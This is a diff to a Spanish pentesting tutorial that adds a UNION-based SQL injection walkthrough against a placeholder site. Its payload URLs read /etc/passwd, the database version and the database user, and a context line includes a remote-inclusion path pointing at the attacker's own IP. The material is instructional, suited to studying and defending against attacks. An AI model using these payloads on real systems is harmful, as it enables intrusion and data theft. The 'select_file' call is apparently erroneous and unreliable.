@@ -935,6 +935,24 @@ path=http://nuestraIP/wp-load.php`
 
 De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.
 
+#### SQLI
+
+Ejemplo básico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3
+
+Comprobamos que la web es vulnerable a inyección SQL:
+
+`http://www.paginaweb.com/contenidos.php?Id=-1 `
+
+Enumeramos hasta coincidir con el número de columnas para generar las etiquetas:
+
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -`
+
+Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, así como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:
+
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -`
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -`
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -`
+
 ### Pentesting Linux
 
 ### Pentesting Windows
